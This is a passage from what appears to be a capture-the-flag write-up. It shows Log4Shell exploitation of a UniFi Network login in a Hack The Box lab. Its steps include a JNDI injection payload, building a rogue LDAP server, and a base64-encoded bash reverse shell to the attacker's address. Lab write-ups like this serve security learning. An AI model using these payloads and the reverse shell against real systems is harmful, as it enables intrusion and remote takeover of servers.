</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">435</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="nb">Date</span><span class="p">:</span><span class="w"> </span><span class="n">Fri</span><span class="p">,</span><span class="w"> </span><span class="mi">18</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="mi">05</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">57</span><span class="w"> </span><span class="n">GMT</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="k">Connection</span><span class="p">:</span><span class="w"> </span><span class="k">close</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="o">&lt;!</span><span class="n">doctype</span><span class="w"> </span><span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">html</span><span class="w"> </span><span class="n">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span><span class="o">&gt;&lt;</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">HTTP</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="mi">400</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Request</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;&lt;</span><span class="n">style</span><span class="w"> </span><span class="k">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span><span class="o">&gt;</span><span class="n">body</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="n">family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="n">sans</span><span class="o">-</span><span class="n">serif</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h1</span><span class="p">,</span><span class="w"> </span><span class="n">h2</span><span class="p">,</span><span class="w"> </span><span class="n">h3</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="err">{</span><span class="n">color</span><span class="p">:</span><span class="n">white</span><span class="p">;</span><span class="n">background</span><span class="o">-</span><span class="n">color</span><span class="p">:</span><span class="o">#</span><span class="mi">525</span><span class="n">D76</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h1</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">22</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h2</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">16</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h3</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">14</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">12</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="err">{</span><span class="n">color</span><span class="p">:</span><span class="n">black</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="p">.</span><span class="n">line</span><span class="w"> </span><span class="err">{</span><span class="n">height</span><span class="p">:</span><span class="mi">1</span><span class="n">px</span><span class="p">;</span><span class="n">background</span><span class="o">-</span><span class="n">color</span><span class="p">:</span><span class="o">#</span><span class="mi">525</span><span class="n">D76</span><span class="p">;</span><span class="n">border</span><span class="p">:</span><span class="k">none</span><span class="p">;</span><span class="err">}</span><span class="o">&lt;/</span><span class="n">style</span><span class="o">&gt;&lt;/</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">body</span><span class="o">&gt;&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">HTTP</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="mi">400</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">    </span><span class="n">Request</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;&lt;/</span><span class="n">body</span><span class="o">&gt;&lt;/</span><span class="n">html</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">Did</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">follow</span><span class="w"> </span><span class="n">redirect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">129</span><span class="p">.</span><span class="mi">96</span><span class="p">.</span><span class="mi">149</span><span class="p">:</span><span class="mi">8443</span><span class="o">/</span><span class="n">manage</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="k">open</span><span class="o">-</span><span class="n">proxy</span><span class="p">:</span><span class="w"> </span><span class="n">Proxy</span><span class="w"> </span><span class="n">might</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">redirecting</span><span class="w"> </span><span class="n">requests</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">8443</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ssl</span><span class="o">/</span><span class="n">nagios</span><span class="o">-</span><span class="n">nsca</span><span class="w"> </span><span class="n">Nagios</span><span class="w"> </span><span class="n">NSCA</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">UniFi</span><span class="w"> </span><span class="n">Network</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_Requested</span><span class="w"> </span><span class="n">resource</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">account</span><span class="o">/</span><span class="n">login</span><span class="o">?</span><span class="n">redirect</span><span class="o">=%</span><span class="mi">2</span><span class="n">Fmanage</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span><span class="w"> </span><span class="n">Subject</span><span class="p">:</span><span class="w"> </span><span class="n">commonName</span><span class="o">=</span><span class="n">UniFi</span><span class="o">/</span><span class="n">organizationName</span><span class="o">=</span><span class="n">Ubiquiti</span><span class="w"> </span><span class="n">Inc</span><span class="p">.</span><span class="o">/</span><span class="n">stateOrProvinceName</span><span class="o">=</span><span class="k">New</span><span class="w"> </span><span class="n">York</span><span class="o">/</span><span class="n">countryName</span><span class="o">=</span><span class="n">US</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">Subject</span><span class="w"> </span><span class="n">Alternative</span><span class="w"> </span><span class="n">Name</span><span class="p">:</span><span class="w"> </span><span class="n">DNS</span><span class="p">:</span><span class="n">UniFi</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="k">Not</span><span class="w"> </span><span class="k">valid</span><span class="w"> </span><span class="k">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2021</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">30</span><span class="n">T21</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">24</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_Not</span><span class="w"> </span><span class="k">valid</span><span class="w"> </span><span class="k">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2024</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">03</span><span class="n">T21</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">24</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">unrecognized</span><span class="w"> </span><span class="n">despite</span><span class="w"> </span><span class="n">returning</span><span class="w"> </span><span class="k">data</span><span class="p">.</span><span class="w"> </span><span class="k">If</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">know</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">service</span><span class="o">/</span><span class="k">version</span><span class="p">,</span><span class="w"> </span><span class="n">please</span><span class="w"> </span><span class="n">submit</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">fingerprint</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="n">bin</span><span class="o">/</span><span class="n">submit</span><span class="p">.</span><span class="n">cgi</span><span class="o">?</span><span class="k">new</span><span class="o">-</span><span class="n">service</span><span class="w"> </span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="o">-</span><span class="n">Port8080</span><span class="o">-</span><span class="n">TCP</span><span class="p">:</span><span class="n">V</span><span class="o">=</span><span class="mi">7</span><span class="p">.</span><span class="mi">92</span><span class="o">%</span><span class="n">I</span><span class="o">=</span><span class="mi">7</span><span class="o">%</span><span class="n">D</span><span class="o">=</span><span class="mi">2</span><span class="o">/</span><span class="mi">18</span><span class="o">%</span><span class="n">Time</span><span class="o">=</span><span class="mi">620</span><span class="n">F2A45</span><span class="o">%</span><span class="n">P</span><span class="o">=</span><span class="n">x86_64</span><span class="o">-</span><span class="n">pc</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">Ge</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:</span><span class="n">tRequest</span><span class="p">,</span><span class="mi">84</span><span class="p">,</span><span class="s2">&#34;HTTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:/manage\r\nContent-Length:\x200\r\nDate:\x20Fri,\x2018\x20Feb\x202022\x
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:2005:21:56\x20GMT\r\nConnection:\x20close\r\n\r\n&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">HTTPOptions</span><span class="p">,</span><span class="mi">84</span><span class="p">,</span><span class="s2">&#34;H
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:TTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080/manage\r\nCon
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:tent-Length:\x200\r\nDate:\x20Fri,\x2018\x20Feb\x202022\x2005:21:56\x20
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:GMT\r\nConnection:\x20close\r\n\r\n&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">RTSPRequest</span><span class="p">,</span><span class="mi">24</span><span class="n">E</span><span class="p">,</span><span class="s2">&#34;HTTP/1\.1\x204
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:00\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Fri,\x2018\x20Feb\x202022\
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:x2005:21:56\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;ht
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ml\x20lang=\&#34;</span><span class="n">en</span><span class="err">\</span><span class="s2">&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x2
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0Bad\x20Request&lt;/title&gt;&lt;style\x20type=\&#34;</span><span class="nb">text</span><span class="o">/</span><span class="n">css</span><span class="err">\</span><span class="s2">&#34;&gt;body\x20{font-family
</span></span></span><span class="line"><span class="cl"><span class="s2">SF::Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;ba
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ckground-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size
</span></span></span><span class="line"><span class="cl"><span class="s2">SF::16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{c
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:olor:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:n
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:one;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:Bad\x20Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">FourOhFourRequest</span><span class="p">,</span><span class="mi">24</span><span class="n">A</span><span class="p">,</span><span class="s2">&#34;HTTP/1\.1\
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:x20404\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Langu
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:age:\x20en\r\nContent-Length:\x20431\r\nDate:\x20Fri,\x2018\x20Feb\x202
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:022\x2005:21:57\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:&gt;&lt;html\x20lang=\&#34;</span><span class="n">en</span><span class="err">\</span><span class="s2">&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20404\x20\xe2\x80\x9
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:3\x20Not\x20Found&lt;/title&gt;&lt;style\x20type=\&#34;</span><span class="nb">text</span><span class="o">/</span><span class="n">css</span><span class="err">\</span><span class="s2">&#34;&gt;body\x20{font-fami
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ly:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:background-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-si
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ze:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:{color:black;}\x20\.line\x20{height:1px;background-color:#525D76;border
</span></span></span><span class="line"><span class="cl"><span class="s2">SF::none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20404\x20\xe2\x80\x93\x
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:20Not\x20Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">Socks5</span><span class="p">,</span><span class="mi">24</span><span class="n">E</span><span class="p">,</span><span class="s2">&#34;HTTP/1\.1\x20400\x20\
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:r\nContent-Length:\x20435\r\nDate:\x20Fri,\x2018\x20Feb\x202022\x2005:2
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:1:57\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x20l
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ang=\&#34;</span><span class="n">en</span><span class="err">\</span><span class="s2">&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x2
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0Request&lt;/title&gt;&lt;style\x20type=\&#34;</span><span class="nb">text</span><span class="o">/</span><span class="n">css</span><span class="err">\</span><span class="s2">&#34;&gt;body\x20{font-family:Tahoma
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgroun
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:d-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bl
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ack;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}&lt;/
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="n">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">CPE</span><span class="p">:</span><span class="w"> </span><span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="n">done</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">Fri</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">18</span><span class="w"> </span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">25</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="c1">-- 1 IP address (1 host up) scanned in 187.03 seconds
</span></span></span></code></pre></div><h2 id="port-8080">port 8080</h2>
<p>The Nmap scan result shows <code>port 8080</code> is open. It is the <code>http-proxy</code> let&rsquo;s navigate to the port. However, it redirects me to this link
<code>https://10.129.96.149:8443/manage/account/login?redirect=%2Fmanage</code></p>
<h2 id="unifi---6454">unifi - 6.4.54</h2>
<p><img src="unifi-login-page.png" alt="1"></p>
<p>Well, it is just a login page. The first thing I do is try to put some simple credentials such as <code>admin:admin</code>, <code>admin:password</code>, etc. Unfortunately, I can&rsquo;t get access to it but this page also has the version displayed in front of it.</p>
<p>With quick googling, I have found this. <a href="https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi">sprocketsecurity - another log4j on the fire unifi</a>. Turns out this version, is on fire with the new vulnerability from the java logging library, Log4j - <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">CVE-2021-44228</a></p>
<h2 id="exploit">exploit</h2>
<p>In the article, it says:
The vulnerability is in the <code>remember</code> (or in some versions the <code>username</code>) value issued in the login request. shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/api/login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">&lt;TARGET&gt; </span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">109</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Ch-Ua</span><span class="o">:</span> <span class="l">&#34; Not A;Brand&#34;;v=&#34;99&#34;, &#34;Chromium&#34;;v=&#34;96&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Ch-Ua-Mobile</span><span class="o">:</span> <span class="l">?0</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Ch-Ua-Platform</span><span class="o">:</span> <span class="l">&#34;macOS&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json; charset=utf-8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">https://&lt;TARGET&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">same-origin</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">cors</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">empty</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">https://&lt;TARGET&gt;/manage/account/login?redirect=%2Fmanage</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.9</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;asdf&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;asdfas&#34;</span><span class="p">,</span><span class="nt">&#34;remember&#34;</span><span class="p">:</span><span class="s2">&#34;&lt;PAYLOAD&gt;&#34;</span><span class="p">,</span><span class="nt">&#34;strict&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">}</span>
</span></span></code></pre></div><h2 id="how-to-test-it-is-vulnerable-to-log4j">how to test it is vulnerable to log4j</h2>
<p>I find a way easier method to test it in the <code>official walkthrough</code> that you can download. Does it mean I&rsquo;m not trying it and just reading it? Well, if you have that perception. Here is the blog post talking about that.</p>
<p><img src="htb-blog-writeup-is-ok.png" alt="1"></p>
<p>This <a href="https://www.hackthebox.com/blog/It-is-Okay-to-Use-Writeups">blog</a> is written by two talented person <a href="https://twitter.com/ippsec">ippsec</a> &amp; <a href="https://twitter.com/0xdf">0xdf</a></p>
<p>Enough with all that, Let&rsquo;s test it. First I&rsquo;m gonna fire up the <code>burpsuite</code> to <code>intercept</code> the <code>/api/login</code> endpoint. So, I can alter the request to be specific the <code>&quot;remember&quot;</code> parameter. Now, I need to put this payload :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">$</span><span class="o">{</span><span class="n">jndi</span><span class="o">:</span><span class="n">ldap</span><span class="o">:</span><span class="c1">//Tun0 IP Address/test}
</span></span></span></code></pre></div><blockquote>
<p><strong>JNDI</strong> (<code>Java Naming and Directory Interface API</code>). By making calls to this API, applications locate resources and other program objects.</p>
<p><strong>LDAP</strong> <code>(Lightweight Directory Access Protocol</code>) The default port that LDAP runs on is <code>port 389</code>.</p>
</blockquote>
<p><img src="burpsuite.png" alt="1"></p>
<h2 id="tcpdump">tcpdump</h2>
<p>Before sending the payload. First, let&rsquo;s set up the monitoring network on port 389 with <code>tcpdump</code>. This tool will let us monitor the network traffic/dump the network. So, open up another terminal and type:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo tcpdump -i tun0 port <span class="m">389</span>
</span></span></code></pre></div><p>After the tcpdump has been started, click the <code>Send</code> button.</p>
<p><img src="tcpdump.png" alt="1"></p>
<p>The tcpdump output shows a connection being received on my machine. This proves that the application is vulnerable since it is trying to connect on the LDAP port 389.</p>
<h2 id="rogue-jndi">Rogue JNDI</h2>
<p>Rogue JNDI is a malicious LDAP server for JNDI injection attacks. This will help me to receive connections back and execute malicious code. First, let&rsquo;s clone the Github repos of this application.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/veracode-research/rogue-jndi
</span></span></code></pre></div><p><img src="git_clone.png" alt="1"></p>
<p>The <code>rogue-jndi</code> is a Java application. In the <code>official walkthrough</code>. It says we need to install <code>Open-JDK</code> &amp; <code>Maven</code> on our system to build the payload.
However, if you&rsquo;re using the Linux hacking distribution such as <code>parrot os</code> &amp; <code>kali</code>. You might have already installed it in those systems but if you don&rsquo;t. Type this to install it make sure to run it with sudo privilege.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt update <span class="c1"># update the package </span>
</span></span><span class="line"><span class="cl">sudo apt install openjdk-11-jdk -y <span class="c1"># install open-jdk</span>
</span></span><span class="line"><span class="cl">sudo apt install maven <span class="c1"># install maven</span>
</span></span></code></pre></div><p>After all, is done, let&rsquo;s build the <code>Rogue-JNDI</code> Java application.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> rogue-jndi <span class="o">&amp;&amp;</span> mvn package
</span></span></code></pre></div><p><img src="build-success.png" alt="1"></p>
<h2 id="create-a-reverse-shell-payload">create a reverse shell payload</h2>
<p>This will create a <code>.jar</code> file in <code>rogue-jndi/target/</code> directory called <code>RogueJndi-1.1.jar</code>. Before we can run the application. We need to create our reverse shell payload first and encode it with base64 to prevent any encoding issues.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜ <span class="nb">echo</span> <span class="s1">&#39;bash -c bash -i &gt;&amp; /dev/tcp/Tun0 IP/Port 0&gt;&amp;1&#39;</span> <span class="p">|</span> base64
</span></span><span class="line"><span class="cl"><span class="nv">YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwL1R1bjAgSVAvUG9ydCAwPiYxCg</span><span class="o">==</span>
</span></span></code></pre></div><h2 id="rogue-jndi-arguments">rogue-jndi arguments</h2>
<p>After the payload had been created, start the <code>Rogue-JNDI</code> application with these arguments. <code>Example down below</code>;
Make sure to run the Netcat listener on your desire/reverse_shell port to catch the connection back.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  java -jar rogue-jndi/target/RogueJndi-1.1.jar --command <span class="s2">&#34;bash -c {echo,BASE64 STRING}|{base64,-d}|{bash,-i}&#34;</span> --hostname <span class="s2">&#34;Tun0 IP Address&#34;</span>
</span></span></code></pre></div><p><img src="rogue-jndi-argv.png" alt="1"></p>
<p>Going back to <code>burpsuite</code>. Let&rsquo;s intercept the requests once more but this time the payload going to be this instead; <br>
After the payload is already set in place. Now, just click a single button it is the <code>Send</code> button &amp; BINGO!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">$</span><span class="o">{</span><span class="n">jndi</span><span class="o">:</span><span class="n">ldap</span><span class="o">:</span><span class="c1">//Tun0 IP Address:1389/o=tomcat}
</span></span></span></code></pre></div><p><img src="nc.png" alt="1"></p>
<h2 id="upgrade-shell-using-script">upgrade shell using script</h2>
<p><em><font color="yellow">type this command to upgrade shell:</font></em></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">script /dev/null -c bash
</span></span></code></pre></div><h2 id="mongodb">mongoDB</h2>
<p>In this article <a href="https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi">sprocketsecurity - another log4j on the fire unifi</a>. it says the <code>MongoDB</code> instance storing all application is listening on localhost <code>without authentication</code>. This means we can extract the password, alter the data, add our password to it, etc.</p>
<h2 id="checking-mongodb-is-running">checking mongoDB is running</h2>
<p>Just type this command on the victim machine. The output shows us <code>MongoDB</code> is running on the victim machine on <code>port 27117</code>.</p>
